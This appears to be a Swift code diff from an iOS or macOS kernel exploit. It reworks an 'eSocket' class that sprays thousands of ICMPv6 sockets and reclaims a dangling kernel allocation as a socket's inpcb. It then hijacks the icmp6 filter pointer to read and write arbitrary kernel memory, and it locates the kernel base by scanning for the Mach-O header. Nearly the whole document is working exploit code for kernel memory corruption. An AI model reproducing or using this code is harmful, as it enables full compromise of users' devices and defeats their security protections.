@@ -8,12 +8,14 @@
 import Foundation
 import Darwin
 
-let off_inp6_hops = 0x15c
-let off_inp6_icmp6filt = 0x150
-
 class eSocket {
     var socketFD: Int32 = 0
-    var inpcbStart: vm_address_t = 0
+    var inpcbAddr: vm_address_t = 0
+    
+    var textPtr: UInt64 = 0
+    var stashedAddr: UInt64 = 0
+    var virtBase: UInt64 = 0
+    
     let start: vm_address_t
     let count: Int
     let fp: freePages
@@ -23,7 +25,10 @@ class eSocket {
         self.start = fp.getBase()
         self.count = count
         guard fp.grabFreePages() == true else {
-            fatalError()
+            return nil
+        }
+        guard spraySockets() == true else {
+            return nil
         }
     }
     
@@ -44,12 +49,12 @@ class eSocket {
                 guard let hit = findPattern(at: cursor, length: Int(start + pages(j + 1) - cursor), byte: ttl) else {
                     break
                 }
-                let inpcb = hit - vm_address_t(off_inp6_hops)
-                let filt = UnsafeRawPointer(bitPattern: UInt(inpcb + vm_address_t(off_inp6_icmp6filt)))!.loadUnaligned(as: UInt64.self)
+                let inpcb = hit - vm_address_t(kstruct.inpcb.inp6_hops)
+                let filt = UnsafeRawPointer(bitPattern: UInt(inpcb + vm_address_t(kstruct.inpcb.inp6_icmp6filt)))!.loadUnaligned(as: UInt64.self)
                 if filt != 0 && (filt >> 48) == 0xffff {
                     out.append(inpcb)
                 }
-                cursor = hit + vm_address_t(MemoryLayout<UInt8>.size)
+                cursor = hit + vm_address_t(kstruct.inpcb.size)
             }
         }
     }
@@ -58,17 +63,16 @@ class eSocket {
         var newT = 0x3b
         var oldT = 0xf7
         while let fd = sockets.popLast() {
-            defer { sockets.append(fd) }
-            var kr = setsockopt(fd, IPPROTO_IPV6, IPV6_UNICAST_HOPS, &newT, socklen_t(MemoryLayout<Int32>.size))
+            let kr = setsockopt(fd, IPPROTO_IPV6, IPV6_UNICAST_HOPS, &newT, socklen_t(MemoryLayout<Int32>.size))
             if kr != KERN_SUCCESS {
-                print("[eSocket] setsockopt() failed with error: \(String(cString: mach_error_string(kr)))")
+                print("[eSocket] setsockopt() failed.")
                 sockets.removeLast()
                 continue
             }
 
             var matched: vm_address_t = 0
             for inpcb in candidates {
-                let cur = UnsafeRawPointer(bitPattern: UInt(inpcb + vm_address_t(off_inp6_hops)))!.load(as: UInt8.self)
+                let cur = UnsafeRawPointer(bitPattern: UInt(inpcb + vm_address_t(kstruct.inpcb.inp6_hops)))!.load(as: UInt8.self)
                 if cur == UInt8(truncatingIfNeeded: newT) {
                     matched = inpcb
                     break
@@ -84,7 +88,7 @@ class eSocket {
         return nil
     }
     
-    func spraySockets() -> Bool{
+    private func spraySockets() -> Bool{
         var socketFDs: [Int32] = []
         var inpcb: [vm_address_t] = []
         var ttl: Int32 = 0xf7
@@ -93,49 +97,133 @@ class eSocket {
             for fd in socketFDs { close(fd) }
         }
         
-        for i in 0..<3000 {
+        for _ in 0..<3000 {
             let fd = socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6)
             if fd < 0 {
-                print("[eSocket] socket() failed for the \(i)th socket.")
+                print("[eSocket] socket() failed.")
                 return false
             }
-            var kr = setsockopt(fd, IPPROTO_IPV6, IPV6_UNICAST_HOPS, &ttl, socklen_t(MemoryLayout<Int32>.size))
+            let kr = setsockopt(fd, IPPROTO_IPV6, IPV6_UNICAST_HOPS, &ttl, socklen_t(MemoryLayout<Int32>.size))
             if kr != 0 {
-                print("[eSocket] setsockopt() failed with error: \(String(cString: mach_error_string(kr)))")
+                print("[eSocket] setsockopt() failed.")
                 close(fd)
                 return false
             }
             socketFDs.append(fd)
         }
-        print("[eSocket] Allocated initial socket FDs.")
-        for round in 0..<5 {
-            var sprayed = 0
+        print("[eSocket] Sprayed 3000 sockets.")
+        for _ in 0..<5 {
             for _ in 0..<500 {
                 let fd = socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6)
                 if fd < 0 {
-                    print("[eSocket] socket() failed for the \(round * sprayed)th socket.")
+                    print("[eSocket] socket() failed.")
                     return false
                 }
-                var kr = setsockopt(fd, IPPROTO_IPV6, IPV6_UNICAST_HOPS, &ttl, socklen_t(MemoryLayout<Int32>.size))
+                let kr = setsockopt(fd, IPPROTO_IPV6, IPV6_UNICAST_HOPS, &ttl, socklen_t(MemoryLayout<Int32>.size))
                 if kr != 0 {
-                    print("[eSocket] setsockopt() failed with error: \(String(cString: mach_error_string(kr)))")
+                    print("[eSocket] setsockopt() failed.")
                     close(fd)
                     return false
                 }
                 socketFDs.append(fd)
-                sprayed += 1
             }
 
+            print("[eSocket] Finding matches.")
             scanCandidates(ttl: UInt8(ttl), out: &inpcb)
 
+            print("[eSocket] Confirming matches.")
             if let (fd, inpcb) = matchSocket(sockets: &socketFDs, candidates: inpcb) {
                 socketFD = fd
-                inpcbStart = inpcb
-                print("[eSocket] Matched fd \(fd) to inpcb 0x\(String(inpcb, radix: 16)).")
+                inpcbAddr = inpcb
+                print("[eSocket] Dangling allocation 0x\(String(inpcb, radix: 16)) reallocated as the inpcb for socket \(fd).")
+                if(!fp.markUsed(page: inpcb)) {
+                    print("[eSocket] Fail to mark reclaimed page as used.")
+                    return false
+                }
+                if(!fp.clearUnused()) {
+                    print("[eSocket] Fail to deallocate unused pages.")
+                    return false
+                }
+                textPtr = UnsafeMutableRawPointer(bitPattern: UInt(inpcbAddr + vm_address_t(kstruct.inpcb.inp6_icmp6filt)))!.loadUnaligned(as: UInt64.self)
                 return true
             }
-            print("[eSocket] Round \(round): no match (candidates: \(inpcb.count)), retrying.")
+            print("[eSocket] Object not found, retrying.")
         }
         return false
+    }
+    
+    private func stashAddress() {
+        if(stashedAddr != 0) {
+            print("[eSocket] Unknown error stashing address.")
+        }
+        stashedAddr = UnsafeMutableRawPointer(bitPattern: UInt(inpcbAddr + vm_address_t(kstruct.inpcb.inp6_icmp6filt)))!.loadUnaligned(as: UInt64.self)
+    }
+    
+    private func setAddress(address: UInt64) {
+        if(stashedAddr == 0) {
+            stashAddress()
+        }
+        let ptr = UnsafeMutableRawPointer(bitPattern: UInt(inpcbAddr + vm_address_t(kstruct.inpcb.inp6_icmp6filt)))!
+        ptr.storeBytes(of: UInt64(address), as: UInt64.self)
+    }
+    
+    func restoreObjectState() {
+        let ptr = UnsafeMutableRawPointer(bitPattern: UInt(inpcbAddr + vm_address_t(kstruct.inpcb.inp6_icmp6filt)))!
+        ptr.storeBytes(of: UInt64(stashedAddr), as: UInt64.self)
+        stashedAddr = 0
+    }
+    
+    func getPointer() -> UInt64 {
+        return textPtr
+    }
+    
+    func get32B(address: UInt64) -> icmp6_filter? {
+        setAddress(address: address)
+        defer {
+            restoreObjectState()
+        }
+        var outbuf = icmp6_filter()
+        var len = socklen_t(MemoryLayout<icmp6_filter>.size)
+        let kr = getsockopt(socketFD, IPPROTO_ICMPV6, ICMP6_FILTER, &outbuf, &len)
+        if kr != 0 {
+            print("[eSocket] getsockopt() failed.")
+            return nil
+        }
+        return outbuf
+    }
+    
+    func set32B(address: UInt64, bytes: icmp6_filter) -> Bool {
+        setAddress(address: address)
+        defer {
+            restoreObjectState()
+        }
+        var inbuf = bytes
+        let kr = setsockopt(socketFD, IPPROTO_IPV6, ICMP6_FILTER, &inbuf, socklen_t(MemoryLayout<icmp6_filter>.size))
+        if kr != KERN_SUCCESS {
+            print("[eSocket] setsockopt() failed.")
+            return false
+        }
+        return true
+    }
+    
+    private func findBase() -> Bool {
+        var readAddr = (textPtr & ~0x3fff) - 0x4400000
+        while true {
+            guard let out = get32B(address: readAddr) else {
+                return false
+            }
+            if out.icmp6_filt.0 == 0xfeedfacf {
+                virtBase = readAddr
+                return true
+            }
+            readAddr -= 0x4000
+        }
+    }
+    
+    func getBase() -> UInt64 {
+        if(virtBase == 0 && findBase() == false) {
+            print("[eSocket] Unable to find kernel base.")
+        }
+        return virtBase
     }
 }
